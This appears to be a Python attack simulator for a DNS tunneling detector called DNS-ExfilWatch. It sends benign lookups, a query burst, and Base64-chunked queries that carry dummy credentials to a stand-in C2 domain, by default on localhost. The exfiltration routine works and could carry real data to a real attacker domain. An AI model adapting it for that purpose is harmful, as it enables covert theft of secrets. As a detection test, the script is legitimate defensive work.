#!/usr/bin/env python3
"""
DNS-ExfilWatch - Attack Simulator (simulate_attack.py)
Author: Senior Cyber Security Engineer & Systems Software Developer
Platform: Kali Linux / Linux / Cross-Platform

Generates and transmits real, fully-formed DNS query packets (RFC 1035) over UDP port 53.
Simulates:
  1. Benign Baseline Queries (Low Entropy: google.com, github.com)
  2. Base64/Hex Chunked DNS Tunneling Exfiltration (High Entropy > 3.8, Oversized Subdomains)
  3. High-Velocity Query Bursts
"""

from __future__ import annotations

import argparse
import base64
import math
import collections
import os
import random
import socket
import struct
import sys
import time
from typing import List


def calculate_entropy(text: str) -> float:
    """Computes Shannon entropy H(X) for verification display."""
    if not text:
        return 0.0
    length = len(text)
    counts = collections.Counter(text)
    return round(-sum((c / length) * math.log2(c / length) for c in counts.values()), 2)


def build_dns_query_packet(qname: str, qtype_str: str = "TXT") -> bytes:
    """
    Constructs a valid wire-format DNS query packet (RFC 1035) from scratch.
    Works independently of any third-party library or external DNS server.
    """
    # 1. Header Section (12 bytes)
    tx_id = random.randint(1000, 65535)
    flags = 0x0100  # Standard query with recursion desired (RD=1)
    qdcount = 1     # 1 question
    ancount = 0
    nscount = 0
    arcount = 0
    header = struct.pack("!HHHHHH", tx_id, flags, qdcount, ancount, nscount, arcount)

    # 2. Question Section (QNAME + QTYPE + QCLASS)
    qname_bytes = bytearray()
    clean_name = qname.strip().rstrip(".")
    for label in clean_name.split("."):
        encoded_label = label.encode("ascii", errors="replace")
        qname_bytes.append(len(encoded_label))
        qname_bytes.extend(encoded_label)
    qname_bytes.append(0)  # Terminating null byte for root label

    qtype_map = {"A": 1, "CNAME": 5, "NULL": 10, "TXT": 16, "AAAA": 28, "ANY": 255}
    qtype = qtype_map.get(qtype_str.upper(), 16)
    qclass = 1  # IN (Internet class)

    question = bytes(qname_bytes) + struct.pack("!HH", qtype, qclass)
    return header + question


def send_packet(sock: socket.socket, target_ip: str, target_port: int, packet_bytes: bytes) -> bool:
    """Dispatches raw UDP datagram directly to destination."""
    try:
        sock.sendto(packet_bytes, (target_ip, target_port))
        return True
    except Exception as e:
        print(f"  [!] Send error to {target_ip}:{target_port} - {e}")
        return False


def run_simulation(
    target_ip: str,
    target_port: int,
    base_domain: str,
    record_type: str,
    chunk_size: int,
    delay: float,
    mode: str,
) -> None:
    print("\n" + "=" * 70)
    print("      DNS-ExfilWatch: Attack Simulator & Live Verification Tool       ")
    print("=" * 70)
    print(f"Target Destination: {target_ip}:{target_port} (UDP)")
    print(f"Tunnel Domain:      {base_domain}")
    print(f"Record Type:        {record_type}")
    print(f"Simulation Mode:    {mode.upper()}\n")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    total_sent = 0

    try:
        # Stage 1: Benign Baseline Queries
        if mode in ("all", "benign"):
            print("[*] Stage 1: Emitting Benign Baseline Queries (Expected: NORMAL / ALLOWED)...")
            benign_list = [
                "www.google.com",
                "api.github.com",
                "en.wikipedia.org",
                "updates.kali.org",
                "security.debian.org",
            ]
            for domain in benign_list:
                pkt = build_dns_query_packet(domain, "A")
                ent = calculate_entropy(domain.split(".")[0])
                success = send_packet(sock, target_ip, target_port, pkt)
                if success:
                    total_sent += 1
                    print(f"  [+] Benign Query: {domain:<26} (Entropy: {ent:.2f}) -> Sent")
                time.sleep(0.15)
            print()

        # Stage 2: DNS Tunneling Exfiltration
        if mode in ("all", "exfil"):
            print("[*] Stage 2: Simulating DNS Tunneling Exfiltration (Expected: EXFILTRATION / BLOCKED)...")
            secret_data = (
                "CONFIDENTIAL_CREDENTIALS: USER=admin_svc; "
                "TOKEN=ghp_94k2947192847182947198274128; "
                "AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY; "
                "DATABASE_HASH=8f4a2b9e1c0d4a7f2e6b9c8d1a3f5e7b; "
                "EXFIL_DEMO_STREAM_COMPLETE"
            )
            # Base64 encode and make DNS-safe (no '=' padding)
            b64_stream = base64.b64encode(secret_data.encode()).decode().replace("=", "0")
            print(f"  [i] Raw Secret:    {secret_data[:55]}...")
            print(f"  [i] Encoded Bytes: {len(b64_stream)} chars\n")

            chunks = [b64_stream[i : i + chunk_size] for i in range(0, len(b64_stream), chunk_size)]

            for seq, chunk in enumerate(chunks, 1):
                query_name = f"sq{seq}-{chunk}.{base_domain}"
                ent = calculate_entropy(f"sq{seq}-{chunk}")
                pkt = build_dns_query_packet(query_name, record_type)
                success = send_packet(sock, target_ip, target_port, pkt)
                if success:
                    total_sent += 1
                    status = "[SENT]"
                    print(
                        f"  [!] Chunk #{seq:02d} ({len(chunk)}B) Entropy: {ent:.2f} -> {query_name[:40]:<40}... {status}"
                    )
                time.sleep(delay)
            print()

        # Stage 3: High-Velocity Burst
        if mode in ("all", "burst"):
            print("[*] Stage 3: Emitting High-Velocity Query Burst (Expected: VELOCITY BURST)...")
            for i in range(1, 16):
                rand_str = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=36))
                burst_domain = f"burst{i}-{rand_str}.{base_domain}"
                pkt = build_dns_query_packet(burst_domain, "TXT")
                success = send_packet(sock, target_ip, target_port, pkt)
                if success:
                    total_sent += 1
                time.sleep(0.04)
            print(f"  [+] Dispatched 15 rapid queries in < 1 second.\n")

    finally:
        sock.close()

    print("=" * 70)
    print(f"[✔] Simulation Complete! Transmitted {total_sent} DNS packets to {target_ip}:{target_port}.")
    print("    Check the DNS-ExfilWatch dashboard to observe live detections!")
    print("=" * 70 + "\n")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNS-ExfilWatch: Synthetic DNS Tunneling Exfiltration Generator"
    )
    parser.add_argument(
        "-s",
        "--server",
        type=str,
        default="127.0.0.1",
        help="Destination target IP address (default: 127.0.0.1)",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="Destination UDP port (default: 53)",
    )
    parser.add_argument(
        "-d",
        "--domain",
        type=str,
        default="c2-exfil-listener.net",
        help="Target tunnel domain (default: c2-exfil-listener.net)",
    )
    parser.add_argument(
        "-t",
        "--type",
        type=str,
        default="TXT",
        help="DNS record type: TXT, NULL, A, CNAME (default: TXT)",
    )
    parser.add_argument(
        "-c",
        "--chunk-size",
        type=int,
        default=36,
        help="Subdomain chunk size in bytes (default: 36)",
    )
    parser.add_argument(
        "-w",
        "--wait",
        type=float,
        default=0.20,
        help="Delay in seconds between chunk dispatches (default: 0.20)",
    )
    parser.add_argument(
        "-m",
        "--mode",
        type=str,
        default="all",
        choices=["all", "benign", "exfil", "burst"],
        help="Simulation scenario: all, benign, exfil, burst (default: all)",
    )

    args = parser.parse_args()
    run_simulation(
        target_ip=args.server,
        target_port=args.port,
        base_domain=args.domain,
        record_type=args.type,
        chunk_size=args.chunk_size,
        delay=args.wait,
        mode=args.mode,
    )


if __name__ == "__main__":
    main()
